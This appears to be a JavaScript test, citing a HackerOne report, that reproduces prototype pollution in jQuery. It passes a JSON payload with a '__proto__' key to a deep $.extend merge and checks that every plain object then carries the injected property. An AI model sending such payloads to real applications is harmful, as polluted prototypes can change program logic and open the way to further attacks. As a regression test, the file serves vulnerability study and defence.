//https://hackerone.com/reports/454365
test("prototype pollution in jquery", () => {
  const { JSDOM } = require("jsdom");
  const { window } = new JSDOM("");
  const $ = require("jquery")(window);

  obj = {};

  expect({}.polluted).toBe(undefined);

  $.extend(true, {}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
  expect({}.polluted).toBe("yes");
});
